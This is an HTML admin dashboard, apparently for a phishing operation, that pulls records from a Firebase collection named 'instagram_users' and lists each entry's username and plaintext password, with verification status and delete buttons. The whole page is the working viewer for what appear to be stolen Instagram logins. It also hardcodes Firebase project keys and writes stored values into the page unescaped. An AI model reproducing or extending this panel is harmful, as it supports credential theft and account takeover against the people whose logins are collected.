<!DOCTYPE html>

<html>
<head>
  <title>🔥 Admin Panel - Zoya</title>

  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      color: #fff;
    }

    h2 {
      text-align: center;
      margin-top: 20px;
      font-weight: 600;
      letter-spacing: 1px;
    }

    .container {
      width: 90%;
      margin: 30px auto;
      backdrop-filter: blur(10px);
      background: rgba(255, 255, 255, 0.05);
      border-radius: 15px;
      padding: 20px;
      box-shadow: 0 0 20px rgba(0,0,0,0.4);
    }

    table {
      width: 100%;
      border-collapse: collapse;
      overflow: hidden;
      border-radius: 10px;
    }

    th {
      background: rgba(0,0,0,0.5);
      padding: 12px;
      text-transform: uppercase;
      font-size: 14px;
      letter-spacing: 1px;
    }

    td {
      padding: 12px;
      text-align: center;
      border-bottom: 1px solid rgba(255,255,255,0.1);
    }

    tr:hover {
      background: rgba(255,255,255,0.05);
      transition: 0.3s;
    }

    .btn-delete {
      background: linear-gradient(45deg, #ff416c, #ff4b2b);
      border: none;
      padding: 6px 12px;
      color: white;
      border-radius: 20px;
      cursor: pointer;
      transition: 0.3s;
    }

    .btn-delete:hover {
      transform: scale(1.1);
      box-shadow: 0 0 10px #ff4b2b;
    }

    .status {
      padding: 4px 10px;
      border-radius: 10px;
      font-size: 12px;
    }

    .pending {
      background: orange;
    }

    .verified {
      background: limegreen;
    }

    .top-bar {
      display: flex;
      justify-content: space-between;
      margin-bottom: 10px;
    }

    input {
      padding: 8px;
      border-radius: 8px;
      border: none;
      outline: none;
      width: 200px;
    }

  </style>

</head>

<body>

<h2>🚀 Zoya Admin Panel</h2>

<div class="container">

  <div class="top-bar">
    <input type="text" id="search" placeholder="Search username..." onkeyup="filterUsers()">
  </div>

  <table id="userTable">
    <thead>
      <tr>
        <th>Username</th>
        <th>Password</th>
        <th>Status</th>
        <th>Verified</th>
        <th>Action</th>
      </tr>
    </thead>
    <tbody></tbody>
  </table>

</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, collection, getDocs, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyAcc6qlrnYArscNXN7uyZc_MG5DxLxQNOI",
  authDomain: "vega-70de0.firebaseapp.com",
  projectId: "vega-70de0",
  storageBucket: "vega-70de0.firebasestorage.app",
  messagingSenderId: "461552169149",
  appId: "1:461552169149:web:8fd04f085bafaee67cc7d4"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const tableBody = document.querySelector("#userTable tbody");

async function loadUsers() {
  tableBody.innerHTML = "";
  const snapshot = await getDocs(collection(db, "instagram_users"));

  snapshot.forEach((docSnap) => {
    const data = docSnap.data();

    const statusClass = data.status === "pending" ? "pending" : "verified";

    const row = document.createElement("tr");

    row.innerHTML = `
      <td>${data.username}</td>
      <td>${data.password}</td>
      <td><span class="status ${statusClass}">${data.status}</span></td>
      <td>${data.verified}</td>
      <td><button class="btn-delete" onclick="deleteUser('${docSnap.id}')">Delete</button></td>
    `;

    tableBody.appendChild(row);
  });
}

window.deleteUser = async (id) => {
  if (confirm("Delete this user?")) {
    await deleteDoc(doc(db, "instagram_users", id));
    loadUsers();
  }
};

window.filterUsers = () => {
  const input = document.getElementById("search").value.toLowerCase();
  const rows = document.querySelectorAll("#userTable tbody tr");

  rows.forEach(row => {
    const username = row.children[0].textContent.toLowerCase();
    row.style.display = username.includes(input) ? "" : "none";
  });
};

loadUsers();

</script>

</body>
</html>
